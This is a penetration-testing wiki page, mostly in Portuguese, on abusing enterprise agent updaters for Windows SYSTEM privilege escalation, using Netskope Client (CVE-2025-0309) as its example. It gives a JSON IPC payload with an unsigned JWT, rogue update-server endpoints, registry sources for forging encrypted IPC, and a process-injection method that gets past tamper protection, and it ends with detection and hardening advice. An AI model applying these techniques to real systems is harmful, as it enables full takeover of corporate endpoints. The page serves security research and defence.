# Abusando de Auto-Atualizadores Empresariais e IPC Privilegiado (por exemplo, Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de elevação de privilégio local no Windows encontradas em agentes de endpoint e updaters empresariais que expõem uma superfície IPC de baixa fricção e um fluxo de atualização privilegiado. Um exemplo representativo é Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário de baixo privilégio pode coercir o enrollment para um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos similares:
- Abusar do localhost IPC de um serviço privilegiado para forçar re‑enrollment ou reconfiguração para um servidor do atacante.
- Implementar os endpoints de update do fornecedor, entregar uma Trusted Root CA maliciosa e apontar o updater para um pacote malicioso “assinado”.
- Evadir verificações de signer fracas (CN allow‑lists), flags de digest opcionais e propriedades MSI laxas.
- Se o IPC for “encrypted”, derivar key/IV a partir de identificadores de máquina legíveis pelo mundo armazenados no registry.
- Se o serviço restringir callers por image path/process name, injetar em um processo allow‑listed ou spawnar um suspenso e bootstrapar sua DLL via um patch mínimo de thread‑context.

---
## 1) Forçando enrollment para um servidor atacante via localhost IPC

Muitos agentes incluem um processo UI em user‑mode que conversa com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Crie um token JWT de enrollment cujas claims controlam o host backend (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja necessária.
2) Envie a mensagem IPC invocando o comando de provisioning com seu JWT e o nome do tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a contatar seu servidor malicioso para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do caller for baseada em caminho/nome, origine a requisição a partir de um binário de fornecedor autorizado (veja §4).

---
## 2) Sequestrando o canal de atualização para executar código como SYSTEM

Uma vez que o cliente conversa com seu servidor, implemente os endpoints esperados e direcione-o para um MSI do atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retornar config JSON com um intervalo de atualização muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow‑listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow‑listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow‑listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver‑enforced tamper rules.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user‑mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed‑mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in‑process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already‑protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES‑encrypted) IPC messages and includes the suspended‑process injection to originate from an allow‑listed binary.

---
## 7) Detection opportunities (blue team)
- Monitor additions to Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) works well.
- Flag MSI executions initiated by the agent’s service from paths like C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Review agent logs for unexpected enrollment hosts/tenants, e.g.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – look for addonUrl / tenant anomalies and provisioning msg 148.
- Alert on localhost IPC clients that are not the expected signed binaries, or that originate from unusual child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts to a strict allow‑list; reject untrusted domains in clientcode.
- Authenticate IPC peers with OS primitives (ALPC security, named‑pipe SIDs) instead of image path/name checks.
- Keep secret material out of world‑readable HKLM; if IPC must be encrypted, derive keys from protected secrets or negotiate over authenticated channels.
- Treat the updater as a supply‑chain surface: require a full chain to a trusted CA you control, verify package signatures against pinned keys, and fail closed if validation is disabled in config.

## References
- [Aviso – Netskope Client for Windows – Elevação de Privilégios Local via Servidor malicioso (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
